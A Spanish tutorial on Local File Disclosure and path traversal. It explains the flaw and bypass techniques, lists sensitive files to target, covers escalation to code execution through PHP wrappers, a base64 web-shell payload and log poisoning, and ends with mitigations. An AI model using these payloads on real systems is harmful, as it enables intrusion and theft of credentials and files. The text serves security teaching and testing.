# ¿Qué es Local File Disclosure (LFD)?

El Local File Disclosure (LFD), o Divulgación Local de Archivos, es una vulnerabilidad que permite a un atacante leer el contenido de archivos arbitrarios en el sistema de ficheros del servidor donde está alojada la aplicación web. Estos archivos pueden contener información sensible como código fuente de la aplicación, credenciales de configuración, claves privadas, datos de usuarios, o archivos del sistema operativo.

La causa raíz suele ser que la aplicación utiliza input proporcionado por el usuario para construir la ruta a un archivo que luego lee o incluye, sin validar o sanitizar adecuadamente dicho input.

### Directory Traversal (Path Traversal): El Mecanismo Común

El Directory Traversal, también conocido como "Path Traversal" o "Dot Dot Slash (`../`) Attack", es la técnica más común para lograr un LFD. Consiste en manipular la entrada de usuario que especifica un archivo para salir del directorio web raíz o de un directorio de trabajo esperado, y acceder a otros directorios y archivos en el sistema de ficheros del servidor.

- `.` : Representa el directorio actual.
- `..`: Representa el directorio padre (subir un nivel en la jerarquía de directorios).

**Ejemplo Básico:** Una aplicación web carga imágenes usando un parámetro en la URL: `https://sitio-vulnerable.com/ver_imagen.php?archivo=gato_lindo.jpg`

El código del servidor podría ser algo así (PHP):

```php
<?php
  $base_path = "/var/www/html/imagenes/";
  $file_to_load = $_GET['archivo'];
  include($base_path . $file_to_load); 
  // ¡PELIGRO! Concatena input directamente
?>
```

Un atacante puede intentar acceder a archivos fuera del directorio `/var/www/html/imagenes/`:

**Ataque (Linux):** `https://sitio-vulnerable.com/ver_imagen.php?archivo=../../../../../../etc/passwd`

- En Linux, las webs suelen estar en `/var/www/html/` (o similar).
- Usando `../` repetidamente, el atacante intenta subir en la jerarquía de directorios hasta la raíz (`/`) y luego acceder a `/etc/passwd`.
- Leer `/etc/passwd` (que contiene la lista de usuarios del sistema) es un PoC (Proof of Concept) común para LFD en Linux. No contiene contraseñas (esas están en `/etc/shadow`, que normalmente requiere privilegios de root para ser leído), pero confirma la vulnerabilidad.

**Ataque (Windows):** `https://sitio-vulnerable.com/ver_imagen.php?archivo=..\..\..\..\..\boot.ini` (En Windows se usa `..\` en lugar de `../`)

### Archivos Sensibles Comunes a Buscar

**Linux:**

- `/etc/passwd`: Lista de usuarios del sistema.
- `/etc/shadow`: Hashes de contraseñas (requiere privilegios para leer).
- `/etc/hosts`: Mapeo de hostnames a IPs.
- `/etc/resolv.conf`: Configuración de DNS.
- `/etc/issue` o `/etc/motd`: Mensajes del sistema.
- `/proc/version`: Versión del kernel.
- `/proc/sched_debug`: Información del planificador (puede revelar procesos).
- `/proc/self/environ`: Variables de entorno del proceso actual (puede ser útil para RCE).
- `/proc/self/cmdline`: Argumentos con los que se ejecutó el proceso.
- `/proc/mounts`: Sistemas de ficheros montados.
- `/var/log/apache2/access.log`, `/var/log/apache2/error.log`: Logs de Apache.
- `/var/log/auth.log`: Logs de autenticación.
- Código fuente de la aplicación: `/var/www/html/config.php`, `/opt/app/settings.py`, etc.
- Claves SSH: `/home/usuario/.ssh/id_rsa`, `/root/.ssh/id_rsa`.

**Windows:**

- `C:\boot.ini`: Opciones de arranque (sistemas antiguos).
- `C:\Windows\System32\drivers\etc\hosts`: Equivalente a `/etc/hosts`.
- `C:\Windows\win.ini`: Configuración del sistema (sistemas antiguos).
- `C:\Windows\system.ini`: Configuración del sistema (sistemas antiguos).
- `C:\Windows\repair\sam`: Copia de seguridad del SAM (hashes de contraseñas, requiere privilegios).
- `C:\inetpub\wwwroot\web.config`: Configuración de IIS.
- Logs de IIS: `C:\inetpub\logs\LogFiles\W3SVC1\u_exYYMMDD.log`.
- Código fuente: `C:\inetpub\wwwroot\config.asp`, `C:\App\settings.json`.

### Técnicas de Bypass de Filtros y Restricciones

Las aplicaciones pueden intentar prevenir el Path Traversal mediante filtros.

1. **Bypass de Restricciones de Extensión (Sufijos Forzados):** A veces la aplicación añade una extensión esperada al final del input (e.g., `.jpg`, `.pdf`).

   - Input del atacante: `../../../../etc/passwd`
   - Aplicación lo procesa como: `/var/www/html/imagenes/../../../../etc/passwd.jpg` (Esto fallaría).

   **Técnicas de Bypass:**

   - **Null Byte (`%00`):**
     - Payload: `../../../../etc/passwd%00`
     - Resultado en C/PHP (versiones antiguas): `/var/www/html/imagenes/../../../../etc/passwd\0.jpg`. El terminador nulo (`\0`) hace que el resto de la cadena (`.jpg`) se ignore.
     - **Nota:** El null byte es menos efectivo en versiones modernas de PHP (>= 5.3.4) y otros lenguajes que manejan strings de forma más segura.
   - **Uso de `?` (Query String):**
     - Payload: `../../../../etc/passwd?`
     - Resultado: `/var/www/html/imagenes/../../../../etc/passwd?.jpg`. Algunas funciones de acceso a ficheros interpretan `?` como el final de la ruta del archivo y el inicio de una query string, ignorando lo que sigue.
   - **Uso de `#` (Fragmento URL):**
     - Payload: `../../../../etc/passwd#`
     - Menos probable que funcione server-side ya que los fragmentos suelen ser procesados solo por el cliente (navegador). Sin embargo, en algunos casos raros o con lógica personalizada, podría tener efecto.
   - **Path Truncation (Longitud Excesiva):**
     - Si la aplicación usa buffers de tamaño fijo, un nombre de archivo muy largo podría truncarse antes de que se añada el sufijo.
   - **Incluir la Extensión Permitida en un Nombre de Directorio Falso:**
     - Payload: `../../../../etc/passwd/.jpg`
     - Si la aplicación solo verifica `endsWith(".jpg")` pero no normaliza la ruta, podría intentar leer `/etc/passwd/.jpg` como un archivo dentro de un directorio inexistente `.jpg` dentro de `/etc/passwd/`. Esto rara vez funciona para leer el archivo directamente, pero puede revelar información en mensajes de error.
2. **Bypass de Filtros Anti-Traversal (Bloqueo de `../`):**

   - **Codificación URL (URL Encoding):**
     - `.` -> `%2e`
     - `/` -> `%2f` (para path traversal) o `%5c` (para `\` en Windows)
     - `../` -> `%2e%2e%2f`
     - `..\` -> `%2e%2e%5c`
   - **Doble Codificación URL:**
     - `%2e%2e%2f` -> `%252e%252e%252f` (el servidor decodifica una vez, el filtro no lo ve, luego la función de acceso a ficheros vuelve a decodificar o lo interpreta).
   - **Codificaciones No Estándar / Overlong UTF-8:**
     - `/` -> `%c0%af`, `%c1%9c`, etc.
     - `\` -> `%c0%bc`, `%c1%9c`, etc.
     - `../` -> `%2e%2e%c0%af` o `%2e%2e%c1%9c`
   - **"Doble Traversal" o Variantes:**
     - Si el filtro elimina la primera ocurrencia de `../` de forma no recursiva.
     - `....//` -> (tras eliminar `../`) `../`
     - `..././` -> (tras eliminar `../`) `./` (no útil) o `..%2F./` -> (tras eliminar `../`) `./`
     - El ejemplo `....//` a menudo se interpreta como `../` por el sistema de archivos después de la normalización (e.g., `foo/....//bar` -> `foo/../bar` -> `bar`).
     - Variaciones: `../../`, `..\/`, `..\.\`, `/%5C..`
   - **Uso de Rutas Absolutas:**
     - Si el filtro solo bloquea `../` pero la aplicación permite rutas absolutas si el input no empieza por un path esperado.
     - Payload: `/etc/passwd` o `C:/Windows/win.ini`
   - **Encapsulamiento o Wrappers:**
     - En algunos casos, si la aplicación usa wrappers o protocolos especiales, se pueden encontrar bypasses específicos (e.g., `file:///etc/passwd`).

**Ejemplo de Ataque Combinado (Corregido y Clarificado):** La petición original del usuario era: `GET http://cryptosite.com/download_earnings?u=%2e%20%2f%2e%20%2f%20%2e%2fetc%2fpasswd%00csv HTTP/1.1` Los `%20` (espacios) en la secuencia de traversal son incorrectos. Asumiendo que se quería añadir `.csv` y bypassarlo con null byte:

`GET http://cryptosite.com/download_earnings?u=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00.csv HTTP/1.1`

- `%2e%2e%2f` es `../` codificado.
- `%00` es el null byte.
- `.csv` es el sufijo que la aplicación podría estar añadiendo y que se intenta truncar con el null byte.

### Escalada de LFI a RCE (Remote Code Execution)

Un LFD/LFI se vuelve mucho más crítico si se puede escalar a Ejecución Remota de Código. Esto depende mucho de la tecnología del servidor (especialmente PHP) y de lo que se pueda incluir/leer.

1. **Wrappers de PHP:**
   - **`php://filter`**: Permite leer archivos usando filtros de codificación (e.g., base64), lo que puede ayudar a exfiltrar binarios o evitar que el código PHP se ejecute si se incluye.
     - `?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd`
     - `?file=php://filter/read=string.rot13/resource=index.php` (para ofuscar ligeramente el código PHP y leerlo)
   - **`php://input`**: Permite incluir el cuerpo de una petición POST. Si se puede incluir y el contenido es código PHP, se ejecutará.
     - `?file=php://input` (y en el cuerpo del POST: `<?php system('id'); ?>`)
   - **`data://` wrapper**: Permite incluir datos codificados directamente en la URL.
     - `?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+` (payload `<?php system($_GET['cmd']); ?>` en base64) y luego `&cmd=id`.
   - **`expect://` wrapper**: Si el módulo `expect` de PHP está cargado, permite ejecutar comandos.
     - `?file=expect://id`
2. **Envenenamiento de Logs (Log Poisoning):**
   - Si un atacante puede escribir código PHP en un archivo de log que luego puede incluir vía LFI.
   - **Logs de Apache:** Hacer una petición a Apache con código PHP en la URL o en el User-Agent.
     - `GET /<?php system('id'); ?> HTTP/1.1` (esto se loguea).
     - Luego incluir el log: `?file=../../../../var/log/apache2/access.log`
   - **Logs de SSH (`/var/log/auth.log`):** Intentar loguear como un usuario `<?php system('id'); ?>@servidor_victima`.
3. **Inclusión de `/proc/self/environ`:**
   - Si el servidor web permite controlar variables de entorno (e.g., a través de la cabecera User-Agent si se usa como variable en algún CGI) y el LFI puede leer `/proc/self/environ`.
   - El atacante inyecta código PHP en una variable de entorno y luego incluye `/proc/self/environ`.
4. **Inclusión de Archivos de Sesión PHP:**
   - Si la aplicación almacena datos controlados por el usuario en archivos de sesión PHP y el atacante conoce la ruta y el formato de estos archivos.
   - El atacante guarda código PHP en su sesión, luego usa el LFI para incluir su propio archivo de sesión.
5. **Vulnerabilidad de Subida de Archivos + LFI:**
   - Si el atacante puede subir un archivo (e.g., una imagen) que contenga código PHP (a veces con extensión doble como `payload.php.jpg`), y luego usar el LFI para incluir ese archivo subido, el código PHP se ejecutará.

### Metodología de Testeo Sistemática

1. **Identificar Puntos de Entrada:** Busca parámetros que parezcan indicar nombres de archivo, rutas, plantillas, identificadores de recursos (e.g., `file=`, `page=`, `document=`, `template=`, `include=`, `path=`, `style=`, `item=`).
2. **Prueba de Traversal Básico:**
   - Intenta leer `/etc/passwd` o `C:\Windows\win.ini` usando secuencias `../` o `..\`.
   - `?file=../../../../etc/passwd`
3. **Analizar Errores:** Los mensajes de error pueden revelar la ruta completa en el servidor, ayudando a calcular cuántos `../` se necesitan.
4. **Probar Bypasses de Filtros de `../`:**
   - Codificaciones (URL, doble URL, no estándar).
   - Secuencias como `....//`.
5. **Probar Bypasses de Sufijos de Extensión:**
   - Null byte (`%00`).
   - Query string (`?`).
   - Fragmento (`#`).
6. **Usar Listas de Fuzzing:** Herramientas como Burp Intruder o `ffuf` con listas de payloads de LFI (e.g., de SecLists) para probar muchas variaciones automáticamente.
7. **Intentar Escalada a RCE:** Si se confirma LFI en un servidor PHP, probar los vectores de RCE (wrappers, log poisoning, etc.).

### Mitigaciones Clave

1. **Validación Estricta de Entradas (Whitelist):**
   - La mejor defensa. En lugar de intentar sanitizar rutas, mantener una lista blanca de archivos o patrones de archivos permitidos y solo permitir esos.
   - Ej: Si `page=inicio`, la aplicación carga `templates/inicio.html`. El input del usuario nunca es parte de una ruta de archivo.
2. **Sanitización y Normalización de Rutas:**
   - Si se debe usar input del usuario en rutas, normalizar la ruta (resolver `../`, `./`) y luego verificar que la ruta resultante siga estando dentro del directorio base esperado (chroot jail o validación estricta del path canónico).
   - Eliminar o rechazar secuencias `../` y `..\` después de la normalización.
3. **Principio de Mínimos Privilegios:**
   - Ejecutar el proceso del servidor web con los permisos más bajos posibles. El usuario del servidor web no debería tener permiso para leer archivos sensibles fuera de su directorio raíz.
4. **Deshabilitar Carga de Módulos PHP Peligrosos:**
   - Si no se usan, deshabilitar wrappers como `expect://` o funciones que puedan facilitar RCE.
5. **Configuración Segura del Servidor:**
   - No permitir listado de directorios.
   - Configurar logs para que no sean fácilmente envenenables o accesibles vía LFI.
6. **Manejo de Errores Genérico:** No revelar rutas completas o información sensible en los mensajes de error.
